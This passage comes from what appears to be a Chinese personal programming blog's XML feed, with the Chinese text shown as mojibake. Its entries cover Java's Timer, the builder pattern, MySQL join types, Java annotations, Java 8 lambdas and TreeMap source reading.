Ôºåtask1Ôºå„ÄÇ„ÄÇ„ÄÇ,<br>ÂΩìÊâßË°åÂà∞task2Êó∂ÔºåÊäõÂá∫ÂºÇÂ∏∏ÔºåËÄåÊàë‰ª¨Âú®ËøêË°åÁöÑÊó∂ÂÄôÔºåÂú®TimerThreadÁöÑmainLoop‰∏≠ÁöÑtask.runÔºàÔºâÔºåÊàë‰ª¨Âπ∂Ê≤°ÊúâËøõË°åtry<br>catchÔºå‰πüÂ∞±ÊòØËØ¥Ôºå‰∏ÄÊó¶Âá∫Áé∞ÂºÇÂ∏∏ÔºåÊàë‰ª¨Ê≤°ÊúâÊçïËé∑Ôºåtimer-0Ëøô‰∏™Á∫øÁ®ãÂ∞±‰ºöÁªàÊ≠¢ÔºåËÄåtimerÊúâÊó∂ÂçïÁ∫øÁ®ãÔºå‰πüÂ∞±ÊòØ‰ºöÂá∫Áé∞Á®ãÂ∫èÂºÇÂ∏∏ÁªàÊ≠¢„ÄÇ</p><p>Âõ†‰∏∫ÔºåËá™Â∑±ÁöÑÂ∫ïÂ≠ê‰∏ÄËà¨Ëà¨ÔºåÂçöÊñá‰∏≠ÁöÑ‰∏Ä‰∫õÊúØËØ≠ÂèØËÉΩ‰ΩøÁî®ÈîôËØØÔºåÊàñËÄÖÊúâÂ≠óÊâìÈîôÔºåÊúõÊåáÊ≠£„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> Timer </tag>
            
            <tag> ÂÆöÊó∂‰ªªÂä° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÊûÑÈÄ†Âô®Ê®°Âºè</title>
      <link href="/2018/09/12/%E6%9E%84%E9%80%A0%E5%99%A8%E6%A8%A1%E5%BC%8F/"/>
      <url>/2018/09/12/%E6%9E%84%E9%80%A0%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>Âπ≥Â∏∏Êàë‰ª¨Êñ∞Âª∫ÂØπË±°ÁöÑÊó∂ÂÄôÔºå‰∏ÄËà¨ÊòØÁõ¥Êé•</p><pre><code>Student student = new Student(&quot;zhangsan&quot;,11,new Date(),&quot;Áî∑&quot;);</code></pre><p>ËøôÊ†∑ÁöÑ‰ª£Á†ÅÂèØËØªÊÄßÊûÅÂ∑Æ„ÄÇ</p><hr><p>‰ΩøÁî®ÊûÑÈÄ†Âô®Ê®°Âºè</p><pre><code>Student student = new Student                .StudentBuilder(&quot;Âº†‰∏â&quot;)                .date(new Date())                .address(&quot;Ê±üËãè&quot;)                .gender(&quot;Áî∑&quot;)                .build();</code></pre><p>ËøôÊ†∑ËÆ©‰∫∫ÂèØ‰ª•Âú®Áúã‰ª£Á†ÅÁöÑÊó∂ÂÄôÔºå‰∏ÄÁõÆ‰∫ÜÁÑ∂<br>‰∏ãÈù¢ÊòØÂÖ∑‰Ωì‰ª£Á†ÅÂÆûÁé∞ÔºöÔºàÂæàÁÆÄÂçïÁöÑÂï¶Ôºâ</p><pre><code>package com.husky.pojo;import java.util.Date;/** * @author husky * @date 2018/9/12 19:47 */public class Student {    private String name;    private Date date;    private String address;    private String gender;    public Student() {        super();    }    public Student(StudentBuilder studentBuilder) {        this.name = studentBuilder.name;        this.date = studentBuilder.date;        this.address = studentBuilder.address;        this.gender = studentBuilder.gender;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    public Date getDate() {        return date;    }    public void setDate(Date date) {        this.date = date;    }    public String getAddress() {        return address;    }    public void setAddress(String address) {        this.address = address;    }    public String getGender() {        return gender;    }    public void setGender(String gender) {        this.gender = gender;    }    @Override    public String toString() {        return &quot;Student{&quot; +                &quot;name=&apos;&quot; + name + &apos;\&apos;&apos; +                &quot;, date=&quot; + date +                &quot;, address=&apos;&quot; + address + &apos;\&apos;&apos; +                &quot;, gender=&apos;&quot; + gender + &apos;\&apos;&apos; +                &apos;}&apos;;    }    public static class StudentBuilder {        private String name;        private Date date;        private String address;        private String gender;        public String getName() {            return name;        }        public Date getDate() {            return date;        }        public String getAddress() {            return address;        }        public String getGender() {            return gender;        }        public StudentBuilder(String name){            this.name = name;        }        public StudentBuilder date(Date date){            this.date = date;            return this;        }        public StudentBuilder address(String address){            this.address = address;            return this;        }        public StudentBuilder gender(String gender){            this.gender = gender;            return this;        }        public Student build(){            return new Student(this);        }    }}</code></pre><p>ÊµãËØï</p><pre><code>Student student = new Student                .StudentBuilder(&quot;Âº†‰∏â&quot;)                .date(new Date())                .address(&quot;Ê±üËãè&quot;)                .gender(&quot;Áî∑&quot;)                .build();        System.out.println(student);</code></pre><p>ËøôÁßçÂÜôÊ≥ïÊúâÁÇπÂÉèjdk8ÁöÑÊµÅÂºèÂÜôÊ≥ïÔºå‰ΩÜÊòØÁº∫ÁÇπÂç¥ÊòØÂæàÊòæÁÑ∂ÔºåËá™Â∑±ÂÜôbuilderÁöÑÊó∂ÂÄôÂçÅÂàÜÁÉ¶Ë∫ÅÔºå‰ª£Á†ÅÂÜó‰Ωô</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> ÊûÑÈÄ†Âô®Ê®°Âºè </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql‰∏≠joinÁöÑËøûÊé•ÊñπÂºè</title>
      <link href="/2018/08/18/mysql%E4%B8%ADjoin%E7%9A%84%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
      <url>/2018/08/18/mysql%E4%B8%ADjoin%E7%9A%84%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>Âú®sql‰∏≠Êúâ4‰∏≠ÊñπÂºè</strong><br>INNER JOIN(JOIN)<br>LEFT JOIN<br>RIGHT JOIN<br>FULL OUTER JOIN(mysql‰∏≠‰∏çÊîØÊåÅ)</p><p>È¶ñÂÖàÂª∫Ë°®</p><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373874.75545226259.png" alt="Ë°®"></p><p>Ëøô‰∫õ‰∏úË•øËøòÊòØËá™Â∑±Êêû‰∏ÄÈÅçÊØîËæÉÂ•Ω<br>‰∏ãÈù¢ÊòØÂª∫Ë°®ËØ≠Âè•</p><pre><code>create table names(id int primary key auto_increment,name varchar(20) not null);create table addresses(id int primary key auto_increment,address varchar(20) not null);insert into names values(1,&apos;Google&apos;);insert into names values(2,&apos;Taobao&apos;);insert into names values(3,&apos;Weibo&apos;);insert into names values(4,&apos;Facebook&apos;);insert into addresses values(1,&apos;USA&apos;);insert into addresses values(5,&apos;CHINA&apos;);insert into addresses values(3,&apos;CHINA&apos;);insert into addressesnames values(6,&apos;USA&apos;);</code></pre><hr><p>INNER JOIN<br>ÂÜÖËøûÊé•ÊòØÊúÄÂ∏∏ËßÅÁöÑ‰∏ÄÁßçËøûÊé•ÔºåÂè™ËøûÊé•ÂåπÈÖçÁöÑË°å<br>inner join‰∏éjoinÊòØÁõ∏ÂêåÁöÑ</p><pre><code>SELECT * FROM names INNER JOIN addresses ON names.id = addresses.id;SELECT * FROM names JOIN addresses ON names.id = addresses.id;</code></pre><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373874.92906982688.png" alt="innerjoin"></p><hr><p>LEFT JOIN<br>ÊòØËøîÂõûÂ∑¶Ë°®ÁöÑÂÖ®ÈÉ®Ë°åÂíåÂè≥Ë°®Êª°Ë∂≥ONÂÖ≥Á≥ªÔºåÂ¶ÇÊûúÂ∑¶Ë°®ÁöÑË°åÂú®Âè≥Ë°®‰∏≠Ê≤°ÊúâÂåπÈÖçÔºåÈÇ£‰πàËøô‰∏ÄË°åÂè≥Ë°®‰∏≠ÂØπÂ∫îÊï∞ÊçÆÂ∞±Áî®NULL‰ª£Êõø</p><pre><code>SELECT * FROM names LEFT JOIN addresses ON names.id = addresses.id;</code></pre><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373875.08512455434.png" alt="leftjoin"></p><hr><p>RIGHT JOIN<br>ËøîÂõûÂè≥Ë°®ÁöÑÂÖ®ÈÉ®Ë°åÂíåÂ∑¶Ë°®Êª°Ë∂≥ONÊù°‰ª∂ÁöÑË°åÔºåÂ¶ÇÊûúÂè≥Ë°®ÁöÑË°åÂú®Â∑¶Ë°®‰∏≠Ê≤°ÊúâÂåπÈÖçÔºåÈÇ£‰πàËøô‰∏ÄË°åÂ∑¶Ë°®‰∏≠ÂØπÂ∫îÊï∞ÊçÆÁî®NULL‰ª£Êõø„ÄÇ</p><pre><code>SELECT * FROM names RIGHT JOIN addresses ON names.id = addresses.id;</code></pre><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373875.25241669809.png" alt="RIGHTJOIN"></p><hr><p>ÂΩìÁÑ∂ËøòÊúâÂÖ®ËøûÊé•<br>FULL OUTER JOIN<br>‰ºö‰ªéÂ∑¶Ë°® ÂíåÂè≥Ë°® ÈÇ£ÈáåËøîÂõûÊâÄÊúâÁöÑË°å„ÄÇÂ¶ÇÊûúÂÖ∂‰∏≠‰∏Ä‰∏™Ë°®ÁöÑÊï∞ÊçÆË°åÂú®Âè¶‰∏Ä‰∏™Ë°®‰∏≠Ê≤°ÊúâÂåπÈÖçÁöÑË°åÔºåÈÇ£‰πàÂØπÈù¢ÁöÑÊï∞ÊçÆÁî®NULL‰ª£Êõø<br>ÂΩìÁÑ∂‰∫ÜÔºåmysql‰∏≠Âπ∂‰∏çÊîØÊåÅfull outer join<br>Âè™ËÉΩÁî®unionÊù•Êõø‰ª£</p><pre><code>SELECT * FROM names LEFT JOIN addresses ON names.id = addresses.idUNIONSELECT * FROM names RIGHT JOIN addresses ON names.id = addresses.id</code></pre><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373875.5106293282.png" alt="full"></p><hr><hr><p>Âõ†‰∏∫‰∏äËØæ‰∏çËÆ§ÁúüÂê¨ËÆ≤ÔºåÊÄªÊòØÊÑüËßâÂ≠¶ÁöÑ‰∏çÂ§üÂÖ®Èù¢ÔºåÊâÄ‰ª•‰∏ìÈó®ÊäΩÁ©∫Ë°•ËØæ‰∫ÜmysqlÁöÑ‰π¶ÔºåÊúÄËøëÂú®Áúãmysql ÂøÖÁü•ÂøÖ‰ºö<br>‰ª•‰∏äÂÜÖÂÆπÂ≠¶‰π†Êù•Ëá™‰ª•‰∏ãÂçöÂÆ¢<br><a href="https://www.cnblogs.com/tigerhsu/p/5113938.html" target="_blank" rel="noopener"> https://www.cnblogs.com/tigerhsu/p/5113938.html</a><br><a href="https://www.cnblogs.com/reaptomorrow-flydream/p/8145610.html" target="_blank" rel="noopener"> https://www.cnblogs.com/reaptomorrow-flydream/p/8145610.html</a><br>‰∫≤ÂäõËÄå‰∏∫ÔºàÂäõÂ•ΩÂÉèÈîô‰∫ÜÔºâ</p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> join </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java annotation</title>
      <link href="/2018/08/17/java%20annotation/"/>
      <url>/2018/08/17/java%20annotation/</url>
      
        <content type="html"><![CDATA[<p>java annotation Ê≥®Ëß£<br><strong><em>ÂÆòÊñπËß£ÈáäÔºö</em> **<br>**Ê≥®Ëß£ ÊòØ‰∏ÄÁ≥ªÂàóÂÖÉÊï∞ÊçÆÔºåÂÆÉÊèê‰æõÊï∞ÊçÆÁî®Êù•Ëß£ÈáäÁ®ãÂ∫è‰ª£Á†ÅÔºå‰ΩÜÊòØÊ≥®Ëß£Âπ∂ÈùûÊòØÊâÄËß£ÈáäÁöÑ‰ª£Á†ÅÊú¨Ë∫´ÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇÊ≥®Ëß£ÂØπ‰∫é‰ª£Á†ÅÁöÑËøêË°åÊïàÊûúÊ≤°ÊúâÁõ¥Êé•ÂΩ±Âìç</strong><br><em>Ê≥®Ëß£ÊúâÂæàÂ§öÂ•ΩÂ§Ñ</em> Ôºå‰∏ªË¶ÅÂ¶Ç‰∏ãÔºö<br>-Êèê‰æõ‰ø°ÊÅØÁªôÁºñËØëÂô®ÔºöÁºñËØëÂô®ÂèØ‰ª•Âà©Áî®Ê≥®Ëß£Êù•Êé¢ÊµãÈîôËØØÂíåË≠¶Âëä‰ø°ÊÅØ<br>-ÁºñËØëÈò∂ÊÆµÊó∂ÁöÑÂ§ÑÁêÜÔºöËΩØ‰ª∂Â∑•ÂÖ∑ÂèØ‰ª•Âà©Áî®Ê≥®Ëß£‰ø°ÊÅØÊù•ÁîüÊàê‰ª£Á†ÅÔºåHtmlÊñáÊ°£ÊàñËÄÖÂÖ∂‰ªñÁõ∏Â∫îÂ§ÑÁêÜ<br>-ËøêË°åÊó∂ÁöÑÂ§ÑÁêÜÔºöÊüê‰∫õÊ≥®Ëß£ÂèØ‰ª•Âú®Á®ãÂ∫èËøêË°åÁöÑÊó∂ÂÄôÊé•Âèó‰ª£Á†ÅÁöÑÊèêÂèñ </p><p>È¶ñÂÖàËÆ≤Ëß£‰∏Ä‰∏ãannotationÂÖ∑‰ΩìÁöÑË°®Áé∞ÂΩ¢ÂºèÔºö</p><pre><code>package com.husky.reflection.main.annotation;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;@Retention(RetentionPolicy.RUNTIME)public @interface Check {}package com.husky.reflection.main.annotation;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;/** * @author husky * Ê≥®Èáä@TableSQLÔºåÂè™ÂÆö‰πâ‰∏Ä‰∏™valueÂÄºÊù•Êò†Â∞ÑË°®ÂêçÔºåÈªòËÆ§ÂÄº‰∏∫Á©∫„ÄÇ * Â¶ÇÊûúÁ®ãÂ∫è‰∏çÁªôÊ≠§ÂÄºÔºåÂ∞Ü‰ΩøÁî®Á±ªÂêçÔºàÂ∞èÂÜôÔºâÊù•‰Ωú‰∏∫Ë°®Âêç * */@Target(ElementType.TYPE)//ÂÆö‰πâÊ≥®ÈáäÂ∫îÁî®‰∫éÁ±ª@Retention(RetentionPolicy.RUNTIME)//ÂÆö‰πâÊ≥®ÈáäÂú®jvmËøêË°åÊó∂‰øùÁïôpublic @interface TableSQL {    String value() default &quot;&quot;;}package com.husky.reflection.main.annotation;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;@Target(ElementType.FIELD)//ÂÆö‰πâÊ≥®Ëß£Â∫îÁî®‰∫éÊàêÂëòÂèòÈáè@Retention(RetentionPolicy.RUNTIME)//ÂÆö‰πâÊ≥®Ëß£Âú®jvmËøêË°åÊó∂‰øùÁïôpublic @interface TableColumnSQL {    String value() default &quot;&quot;;    Constraint constraint() default @Constraint();}</code></pre><p>Ê≥®Ëß£ËøêÁî®ÁöÑÂú∞ÊñπÂæàÂ§öÔºö<br>ÂèØ‰ª•ÁªôÁ±ªÂä†Ê≥®Ëß£Ôºå‰πüÂèØ‰ª•ÁªôÂèòÈáèÂä†Ê≥®Ëß£ÔºåÁ≠âÁ≠â<br>ÂÖ∑‰ΩìÂ¶Ç‰∏ãÔºö<br>ÁªôÁ±ªÂä†Ê≥®Ëß£</p><pre><code>@TestAnnotation()public class Test {}</code></pre><p>ÁªôÂèòÈáèÂä†Ê≥®Ëß£</p><pre><code>@Check(&quot;hi&quot;)int a;</code></pre><p>*<em><em>Â¶ÇÊûúÊ≤°ÊúâÁî®Êù•ËØªÂèñÊ≥®Ëß£ÁöÑÂ∑•ÂÖ∑ÔºåÈÇ£Ê≥®Ëß£Â∞ÜÊ≤°Êúâ‰ªª‰Ωï‰ΩúÁî®ÔºåÂÆÉ‰πü‰∏ç‰ºöÊØîÊ≥®ÈáäÊõ¥ÊúâÁî®„ÄÇËØªÂèñÊ≥®Ëß£ÁöÑÂ∑•ÂÖ∑Âè´‰ΩúÊ≥®Ëß£Â§ÑÁêÜÂô®„ÄÇjavaÊèê‰æõ‰∫Ü‰∏§ÁßçÊñπÂºèÊù•Â§ÑÁêÜÊ≥®Ëß£ÔºöÁ¨¨‰∏ÄÁßçÊòØÂà©Áî®ËøêË°åÊó∂ÂèçÂ∞ÑÊú∫Âà∂ÔºõÂè¶‰∏ÄÁßç‰ΩøÁî®javaÊèê‰æõÁöÑapiÊù•Â§ÑÁêÜÁºñËØëÊúüÁöÑÊ≥®Ëß£</em><br>*</em></p><p>ËøôÂ∞±ËøêÁî®Âà∞‰∫Üjava<br>reflectionÂèçÂ∞ÑÔºåÂú®ËøêË°åÊó∂ÔºåÈÄöËøáËé∑ÂèñclassÔºåÁÑ∂ÂêéÈÄöËøágetDeclaredAnnotations()Ëé∑ÂèñÁ±ªÁöÑAnnotationÔºåÊ†πÊçÆÁ±ªÁöÑAnnotationÊù•ÂÆûÁé∞‰∏Ä‰∫õÂä®‰Ωú</p><p>ÂΩìÁÑ∂ÔºåÈÄöËøáclassËé∑ÂèñÊâÄÊúâÂèòÈáèFieldÔºåÁÑ∂ÂêéÊ†πÊçÆÂèòÈáèFieldËé∑ÂèñAnnotationÊù•ÂÆûÁé∞‰∏Ä‰∫õÂä®‰Ωú</p><p>‰∏ãÈù¢ÔºöÂÖ∑‰ΩìËÆ≤Ëß£Âá†‰∏™Âú®Â∫îÁî®‰∏≠ÁöÑ<br>@TestÊòØjunitÊ°ÜÊû∂‰∏≠Ê≥®Ëß£</p><pre><code>public class ExampleUnitTest {    @Test    public void addition_isCorrect() throws Exception {        assertEquals(4, 2 + 2);    }}</code></pre><p>ButterKnife<br>android‰∏≠ÁöÑiocÊ°ÜÊû∂</p><pre><code>public class MainActivity extends AppCompatActivity {    @BindView(R.id.tv_test)    TextView mTv;    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        ButterKnife.bind(this);    }}</code></pre><p>ÂΩìÁÑ∂ËøòÊúâ‰∏Ä‰∫õÊ≥®ÂÖ•Ôºå@ResourceÔºå@AutoWried‰ªÄ‰πàÁöÑ</p><p>ÂÖ∑‰ΩìÁöÑÂ∞èÂÆû‰æãÔºöÂèØ‰ª•ÂèÇËÄÉ‰ª•‰∏ã‰∏§‰∏™‰æãÂ≠ê<br><a href="https://blog.csdn.net/briblue/article/details/73824058" target="_blank" rel="noopener"> ÂØπÁ±ª‰∏≠ÊñπÊ≥ïËøõË°åÊµãËØï </a><br><a href="https://blog.zenfery.cc/hexo/articles/annotation-2.html" target="_blank" rel="noopener"> ÈÄöËøáÂØπÁ±ªËøõË°åÊ≥®Ëß£Êù•ÁîüÊàêÂª∫Ë°®ËØ≠Âè• </a><br><a href="https://github.com/pompeii666/javaAnnotation" target="_blank" rel="noopener"> ÂÖ∑‰ΩìÊ∫êÁ†ÅÂú® </a> ÂèØËÉΩ‰ºöÊÖ¢‰∏ÄÁÇπÔºåÊòéÂ§©ËÇØÂÆö‰ºö‰∏ä‰º†ÊàêÂäü</p><p>Êú¨ÊñáÁ´†ÂèÇËÄÉ‰∫éÔºö<br><a href="https://blog.csdn.net/briblue/article/details/73824058" target="_blank" rel="noopener"> https://blog.csdn.net/briblue/article/details/73824058</a><br><a href="https://blog.zenfery.cc/hexo/articles/annotation-2.html" target="_blank" rel="noopener"> https://blog.zenfery.cc/hexo/articles/annotation-2.html</a><br><a href="http://ifeve.com/java-reflection/" target="_blank" rel="noopener"> http://ifeve.com/java-reflection/ </a></p><p>‰ªäÂ§©ÊòØ‰∏ÉÂ§ïÔºåÂáÜÂ§áÂá∫ÂéªÂ§úË∑ëÔºåÂ§ßÂÆ∂Âø´‰πê</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> ÂèçÂ∞Ñ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java8 lambda</title>
      <link href="/2018/08/08/java8%20lambda/"/>
      <url>/2018/08/08/java8%20lambda/</url>
      
        <content type="html"><![CDATA[<p>*<em><em>1.ÂåøÂêçÂÜÖÈÉ®Á±ª</em> *</em></p><pre><code>    @Test    public void oldRunable(){        new Thread(new Runnable() {            @Override            public void run() {                System.out.println(&quot;the old runable now is using&quot;);            }        }).start();    }    @Test    public void runable(){        new Thread(() -&gt; System.out.println(&quot;It&apos;s lambda function&quot;)).start();    }//ÊúÄÂêéËæìÂá∫//the old runable now is using//It&apos;s lambda function</code></pre><p>*<em><em>2.lambdaÂØπÈõÜÂêàÁöÑÊìç‰Ωú</em> *</em><br>ÂØπlistÈÅçÂéÜ</p><pre><code>   @Test    public void iterTest(){        List&lt;String&gt; languages = Arrays.asList(&quot;java&quot;,&quot;python&quot;,&quot;scala&quot;);        //before java8        for(String language : languages){            System.out.println(language);        }        //after java8        languages.stream().forEach(x-&gt;System.out.println(x));        //Ê≠§Â§ÑstreamÊòØjava8‰∏≠ÁöÑÊñ∞ÁöÑ‰∏ÄÁßçÊñπÂºèÔºå‰Ω†‰ºöÂèëÁé∞ÂÜô‰∫Üstream()ÁöÑÂíå‰∏ãÈù¢ÁöÑ‰∏ÄÂè•Ê≤°ÊúâÂå∫Âà´ÔºåËøôÁßçÊòØjava8‰∏≠ÁöÑÊµÅÂºèAPIÔºåÊàëÂ∞ÜÂú®‰∏ã‰∏ÄÁØáÂçöÂÆ¢‰∏ìÈó®ÂÜôËøô‰∏™ÊµÅÂºèapi        languages.forEach(x-&gt;System.out.println(x);        //Ê≠§Â§Ñ‰πüÊòØÂØπÂåøÂêçÂÜÖÈÉ®Á±ªÂÜôÊàê‰∫ÜlambdaÂΩ¢Âºè        languages.forEach(new Consumer&lt;String&gt;() {            @Override            public void accept(String s) {                System.out.println(s);            }        });        languages.forEach(System.out::println);//ËøôÂè•‰πüÊòØÂèØ‰ª•ÁöÑ}</code></pre><p>*<em><em>3.Áî®lambdaË°®ËææÂºèÂÆûÁé∞map</em> *</em><br>mapÊòØÂáΩÊï∞ÂºèÁºñÁ®ãÈáåÈù¢ÈáçË¶ÅÁöÑÂáΩÊï∞ÔºåÂ∞±ÊòØÂ∞Ü‰∏Ä‰∏™ÂØπË±°ËΩ¨Êç¢‰∏∫Âè¶‰∏Ä‰∏™</p><pre><code>@Test    public void mapTest(){        List&lt;Double&gt; cost = Arrays.asList(10.0,200.0,30.0,100.0,200.0);        cost.stream().map(x-&gt;x+x*0.5).forEach(System.out::println);    }    /**    ËæìÂá∫ÁªìÊûú15.0300.045.0150.0300.0*/</code></pre><p>*<em><em>4.lambdaÂÆûÁé∞mapÂíåreduce</em> *</em><br>mapÂíåreduce‰∏ÄÊ†∑ÔºåmapÊòØÂ∞Ü‰∏Ä‰∏™ÂØπË±°ËΩ¨Âåñ‰∏∫Âè¶‰∏Ä‰∏™ÔºåËÄåreduceÊòØÂ∞ÜÂ§ö‰∏™ËΩ¨Âåñ‰∏∫‰∏Ä‰∏™</p><pre><code>@Test    public void mapReduceTest(){        List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0);        Double allCost = cost.stream().map(x-&gt;x+0.5*x).reduce((sum,x)-&gt;sum+x).get();        //Ê≠§Â§ÑÂ∞±ÊòØÊµÅÔºàstreamÔºâÂºèapi//        Double allCost2 = cost.stream().map(x-&gt;x+0.5*x).reduce(new BinaryOperator&lt;Double&gt;() {//            @Override//            public Double apply(Double aDouble, Double aDouble2) {//                return aDouble+aDouble2;//            }//        }).get();        System.out.println(allCost);    }    //ËæìÂá∫ÁªìÊûú    //90.0</code></pre><p>Âú®java8‰πãÂâç</p><pre><code>@Test    public void sumTest(){        List&lt;Double&gt; cost = Arrays.asList(10.0,20.0,30.0);        double sum = 0.0;        for(double each : cost){            each += each * 0.5;            sum += each;        }        System.out.println(sum);    }</code></pre><p>*<em><em>5.filter</em> *</em><br>filterÊòØÁ≠õÈÄâ</p><pre><code>@Test    public void filterTest(){        List&lt;Double&gt; cost  = Arrays.asList(10.0,20.0,30.0,40.0);        cost.stream().filter(x-&gt;x&gt;25).forEach(x-&gt;System.out.println(x));//        cost.stream().filter(new Predicate&lt;Double&gt;() {//            @Override//            public boolean test(Double aDouble) {//                if(aDouble &gt;10.0){//                    return true;//                }else {//                    return false;//                }//            }//        }).forEach(x-&gt;System.out.println(x));    }</code></pre><p>*<em><em>6.‰∏éÂáΩÊï∞ÂºèÊé•Âè£PredicateÈÖçÂêà</em> *</em><br>Èô§‰∫ÜÂú®ËØ≠Ë®ÄÂ±ÇÈù¢ÊîØÊåÅÂáΩÊï∞ÂºèÁºñÁ®ãÈ£éÊ†ºÔºåJava 8‰πüÊ∑ªÂä†‰∫Ü‰∏Ä‰∏™ÂåÖÔºåÂè´ÂÅö<br>java.util.function„ÄÇÂÆÉÂåÖÂê´‰∫ÜÂæàÂ§öÁ±ªÔºåÁî®Êù•ÊîØÊåÅJavaÁöÑÂáΩÊï∞ÂºèÁºñÁ®ã„ÄÇÂÖ∂‰∏≠‰∏Ä‰∏™‰æøÊòØPredicateÔºå‰ΩøÁî®<br>java.util.function.Predicate<br>ÂáΩÊï∞ÂºèÊé•Âè£‰ª•ÂèälambdaË°®ËææÂºèÔºåÂèØ‰ª•ÂêëAPIÊñπÊ≥ïÊ∑ªÂä†ÈÄªËæëÔºåÁî®Êõ¥Â∞ëÁöÑ‰ª£Á†ÅÊîØÊåÅÊõ¥Â§öÁöÑÂä®ÊÄÅË°å‰∏∫„ÄÇPredicateÊé•Âè£ÈùûÂ∏∏ÈÄÇÁî®‰∫éÂÅöËøáÊª§„ÄÇ</p><pre><code>   public static void filterTest(List&lt;String&gt; langeages,Predicate&lt;String&gt; condition){        langeages.stream().filter(x-&gt;condition.test(x)).forEach(System.out::println);    }@Test    public void filterTestDemo(){        List&lt;String&gt; languages = Arrays.asList(&quot;Java&quot;,&quot;Python&quot;,&quot;Scale&quot;,&quot;Shell&quot;,&quot;R&quot;);        System.out.println(&quot;Languages starts with J:&quot;);        filterTest(languages,x-&gt;x.startsWith(&quot;J&quot;));        System.out.println(&quot;Languages end with a&quot;);        filterTest(languages,x-&gt;x.endsWith(&quot;a&quot;));        System.out.println(&quot;All languages:&quot;);        filterTest(languages,x-&gt;true);        System.out.println(&quot;No languages&quot;);        filterTest(languages,x-&gt;false);        System.out.println(&quot;Language longer than 4&quot;);        filterTest(languages,x-&gt;x.length()&gt;4);    }    /**    ËæìÂá∫ÁªìÊûúLanguages starts with J:JavaLanguages end with aJavaAll languages:JavaPythonScaleShellRNo languagesLanguage longer than 4PythonScaleShell*/</code></pre><p>*<em><em>7.TreeMap</em> *</em><br>person.java</p><pre><code>package com.husky;public class Person {    private String name;    public Person(String name) {        this.name = name;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    @Override    public String toString() {        return &quot;Person{&quot; +                &quot;name=&apos;&quot; + name + &apos;\&apos;&apos; +                &apos;}&apos;;    }} @Test    public void treeMapTest(){        TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person,Integer&gt;((o1, o2) -&gt; o1.getName().compareTo(o2.getName()));        Person person = new Person(&quot;husky&quot;);        Person person1 = new Person(&quot;adios&quot;);        Person person2 = new Person(&quot;husky&quot;);        treeMap.put(person,1);        treeMap.put(person1,2);        treeMap.put(person2,3);        Iterator&lt;Map.Entry&lt;Person,Integer&gt;&gt; it = treeMap.entrySet().iterator();        while(it.hasNext()){            Map.Entry&lt;Person,Integer&gt; m = it.next();            System.out.println(m.getKey());            System.out.println(m.getValue());        }    }//ËæìÂá∫ÁªìÊûú/**Person{name=&apos;adios&apos;}2Person{name=&apos;husky&apos;}3*/</code></pre><p><a href="https://blog.csdn.net/bitcarmanlee/article/details/70195403" target="_blank" rel="noopener"> Ë∂ÖÈìæÊé•Â≠¶‰π† </a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TreeMapÊ∫êÁ†ÅÈòÖËØª</title>
      <link href="/2018/07/19/TreeMap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
      <url>/2018/07/19/TreeMap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>Âü∫Êú¨ÁªìÊûÑ</p><pre><code>    private final Comparator&lt;? super K&gt; comparator;    private transient Entry&lt;K,V&gt; root;    //Ê†πËäÇÁÇπ       /**     * The number of entries in the tree     */    private transient int size = 0;    //ÂÖÉÁ¥†‰∏™Êï∞    /**     * The number of structural modifications to the tree.     */    private transient int modCount = 0;    //Ê†ëÁªìÊûÑ‰øÆÊîπÊï∞//‰∏ãÈù¢ÊòØÊ†πËäÇÁÇπÁöÑÁªìÊûÑÔºåÁ∫¢ÈªëÊ†ë    static final class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; {        K key;        V value;        Entry&lt;K,V&gt; left;        Entry&lt;K,V&gt; right;        Entry&lt;K,V&gt; parent;        boolean color = BLACK;        /**         * Make a new cell with given key, value, and parent, and with         * {@code null} child links, and BLACK color.         */        Entry(K key, V value, Entry&lt;K,V&gt; parent) {            this.key = key;            this.value = value;            this.parent = parent;        }    }</code></pre><p>put</p><pre><code>public V put(K key, V value) {       Entry&lt;K,V&gt; t = root;//Ê†πËäÇÁÇπ       if (t == null) {//Â¶ÇÊûúentryÂΩì‰∏≠ËøòÊ≤°ÊúâÊï∞ÊçÆÔºåÂàùÂßãÂåñ           compare(key, key); // type (and possibly null) check           root = new Entry&lt;&gt;(key, value, null);           size = 1;//ÂÖÉÁ¥†‰∏™Êï∞1           modCount++;//Ê†ëÁªìÊûÑ‰øÆÊîπ+1           return null;       }       int cmp;       Entry&lt;K,V&gt; parent;       // split comparator and comparable paths       